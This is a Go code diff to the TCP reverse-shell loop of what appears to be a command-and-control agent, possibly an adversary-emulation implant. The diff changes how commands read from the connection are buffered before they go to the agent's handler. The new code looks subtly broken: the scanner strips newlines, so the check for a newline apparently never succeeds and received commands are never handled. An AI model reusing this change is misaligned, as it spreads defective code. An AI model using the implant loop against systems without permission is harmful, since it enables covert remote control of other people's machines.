@@ -26,11 +26,16 @@ func (contact TCP) Communicate(agent *util.AgentConfig, beacon util.Beacon) util
 
 			//reverse-shell
 			scanner := bufio.NewScanner(conn)
+			var data string
 			for scanner.Scan() {
-				message := strings.TrimSpace(scanner.Text())
-				respond(conn, beacon, message, agent)
-				if agent.Contact != "tcp" {
-					return beacon
+				data += scanner.Text()
+				if strings.Contains(data, "\n") {
+					message := strings.TrimSpace(data)
+					respond(conn, beacon, message, agent)
+					if agent.Contact != "tcp" {
+						return beacon
+					}
+					data = ""
 				}
 			}
 	   	}
